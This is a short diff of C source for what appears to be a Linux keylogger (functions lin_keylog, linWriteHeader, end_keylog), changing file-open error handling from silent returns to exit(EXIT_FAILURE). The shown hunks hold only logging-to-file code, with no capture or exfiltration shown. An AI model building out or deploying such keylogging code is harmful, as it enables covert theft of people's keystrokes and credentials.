@@ -82,9 +82,8 @@ const char* translate_key(int code) {
 void linWriteHeader(const char* filePath) {
     FILE *file;
     file = fopen(filePath, "a");
-    if (file == NULL) {
-        return;
-    }
+    if (file == NULL)
+        exit(EXIT_FAILURE);
 
     // Write the date and time into the file
     time_t t = time(NULL);
@@ -125,9 +124,9 @@ void lin_keylog(const char* filePath) {
                     // Write the key into the file
                     FILE *file;
                     file = fopen(filePath, "a");
-                    if (file == NULL) {
-                        return;
-                    }
+                    if (file == NULL) 
+                        exit(EXIT_FAILURE);
+
                     fputs(key, file);
                     fflush(file);
                     fclose(file);
@@ -142,7 +141,8 @@ void end_keylog(const char *filePath) {
     // Add a new line to the file
     FILE *file;
     file = fopen(filePath, "a");
-    if (file == NULL) return;
+    if (file == NULL) 
+        exit(EXIT_FAILURE);
     
     fputs("\n", file);
     fflush(file);
